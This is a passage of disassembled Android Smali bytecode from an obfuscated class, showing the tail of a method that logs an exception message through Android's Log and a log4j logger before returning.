    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "TAG"

    invoke-static {v3, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    sget-object v2, Lcom/systemservice/a/a/j;->h:Lorg/apache/log4j/Logger;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    :goto_6
    return-void
.end method
